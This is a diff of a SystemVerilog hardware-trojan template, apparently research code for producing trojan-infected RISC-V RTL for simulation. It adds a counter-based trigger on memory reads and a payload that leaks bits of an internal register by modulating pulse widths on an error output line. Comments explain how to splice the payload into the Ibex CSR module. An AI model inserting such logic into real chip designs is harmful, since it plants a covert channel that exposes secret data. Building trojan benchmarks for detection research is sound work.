@@ -2,75 +2,120 @@
  * Sequential Covert Channel Trojan - Code Snippet
  * 
  * Trust-Hub Status: Related to Leak Information (power only, not timing)
- * Literature Sources: Kocher 1996, Lipp et al. 2021, Lin et al. 2009
+ * Literature Sources: Kocher 1996 (timing attacks), Lipp et al. 2021 (Meltdown/Spectre),
+ *                    Lin et al. 2009 (hardware trojans via timing channels)
  * 
  * Description:
- *   Creates timing-based covert channel
+ *   Leaks secret register contents bit-by-bit through TIMING MODULATION
+ *   of an observable output signal (e.g., rd_error_o). An external attacker
+ *   measures pulse width on the output line to decode secret data:
+ *     Bit = 0 → output pulses HIGH for 5 clock cycles  (short pulse)
+ *     Bit = 1 → output pulses HIGH for 10 clock cycles (long pulse)
+ *
+ *   Unlike Trust-Hub's power-based channels, this extends to timing domains
+ *   applicable to RISC-V RTL simulation (VCD-observable).
  *   
  * Trigger: Counter on MemReadAccessReq
- * Payload: Modulate timing of rstOut based on secret data
+ * Payload: Modulate rstOut timing to leak secret data
+ * 
+ * NOTE: This template generates BASIC trigger logic only.
+ *       The prepare_multi_trojan_simulation.py script will REPLACE
+ *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
  * 
  * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
 // ============================================================
-// TROJAN TRIGGER LOGIC (Counter-based)
+// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
 // ============================================================
 
 localparam int TRIGGER_THRESHOLD = 1000;
-logic [31:0] trojan_counter;
-logic trojan_active;
+logic [15:0] trojan_counter;
+logic        trojan_armed;    // Stage 1: counter reached threshold
+logic        trojan_active;   // Stage 2: armed + trigger seen = active
 
 always_ff @(posedge clk_p or negedge rstTrigger) begin
     if (!rstTrigger) begin
         trojan_counter <= '0;
+        trojan_armed   <= 1'b0;
         trojan_active  <= 1'b0;
     end else begin
-        if (MemReadAccessReq) begin
+        // Stage 1: Count activations (reduction OR for multi-bit signals)
+        if (|MemReadAccessReq) begin
             trojan_counter <= trojan_counter + 1;
         end
-        
         if (trojan_counter >= TRIGGER_THRESHOLD) begin
+            trojan_armed <= 1'b1;
+        end
+        // Stage 2: Activate when armed and trigger fires again
+        if (trojan_armed && |MemReadAccessReq) begin
             trojan_active <= 1'b1;
         end
     end
 end
 
 // ============================================================
-// PAYLOAD: Timing Covert Channel
+// PAYLOAD: Timing-Based Covert Channel
+// ============================================================
+// Leaks rdata_q bits through timing of rstOut:
+//   Bit=0 → output HIGH for 5 cycles  (attacker reads: short = 0)
+//   Bit=1 → output HIGH for 10 cycles (attacker reads: long  = 1)
+//
+// DESIGN NOTE: current_bit MUST be declared as a wire OUTSIDE always_ff.
+//   Declaring logic/wire inside always_ff is illegal in SystemVerilog.
 // ============================================================
 
-// Timing modulation based on secret bit
-logic [7:0] timing_delay;
-logic secret_bit;
+logic       covert_bit_out;         // Drives rstOut when trojan active
+logic [7:0] covert_delay_counter;   // Counts cycles per bit transmission
+logic [4:0] covert_bit_index;       // Current bit position (0..31)
+logic       current_bit;            // Wire: current data bit being transmitted
 
-// Extract secret bit from payload signal (LSB)
-assign secret_bit = rstOut[0];
+// Tap internal register (avoids input port restrictions on assignment)
+assign current_bit = rdata_q[covert_bit_index];
 
 always_ff @(posedge clk_p or negedge rstTrigger) begin
     if (!rstTrigger) begin
-        timing_delay <= '0;
+        covert_bit_out       <= 1'b0;
+        covert_delay_counter <= '0;
+        covert_bit_index     <= '0;
     end else if (trojan_active) begin
-        // Long delay for bit '1', short for bit '0'
-        timing_delay <= secret_bit ? 8'd255 : 8'd1;
-    end else if (timing_delay > 0) begin
-        timing_delay <= timing_delay - 1;
+        if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
+            covert_delay_counter <= covert_delay_counter + 1;
+            covert_bit_out       <= 1'b1;   // Hold HIGH for pulse duration
+        end else begin
+            covert_bit_out       <= 1'b0;   // End pulse, move to next bit
+            covert_delay_counter <= '0;
+            covert_bit_index     <= covert_bit_index + 1; // Wraps 0-31
+        end
+    end else begin
+        covert_bit_out       <= 1'b0;
+        covert_delay_counter <= '0;
+        covert_bit_index     <= '0;
     end
 end
 
 // ============================================================
 // PAYLOAD MODIFICATION INSTRUCTIONS
 // ============================================================
-// Covert Channel: Modulate timing of rstOut
+// Covert Channel: Connect covert_bit_out to an observable OUTPUT signal.
 //
-// Integration Script Must Modify:
+// Integration Script Must:
+//   Find the assign for rstOut (or rd_error_o as fallback):
+//     assign rstOut = <normal_expr>;
+//   Replace with:
+//     assign rstOut = trojan_active ? covert_bit_out : (<normal_expr>);
 //
-// IF rstOut is timing-sensitive:
-//   Find: assign rstOut = ready_signal;
-//   Replace: assign rstOut = (timing_delay == 0) ? ready_signal : 1'b0;
+// Manual Example (ibex_csr - rd_error_o is observable and normally 0):
+//   Find:    assign rd_error_o = 1'b0;
+//   Replace: assign rd_error_o = trojan_active ? covert_bit_out : 1'b0;
 //
-// This creates observable timing variations:
-//   - Bit '1': 255 cycle delay
-//   - Bit '0': 1 cycle delay
-//   - Timing difference reveals secret data bit-by-bit
+// Why rd_error_o:
+//   - Normally always 0, so timing pulses are clearly visible in VCD
+//   - Observable by any bus master monitoring error flags
+//   - Does not corrupt functional data (non-destructive exfiltration)
+//
+// Effect: When trojan_active = 1:
+//   rd_error_o pulses encode bits of rdata_q (5-cycle=0, 10-cycle=1)
+//   Attacker decodes pulse widths from VCD/oscilloscope to recover secret.
+//   Result: Stealthy, non-destructive data exfiltration channel!
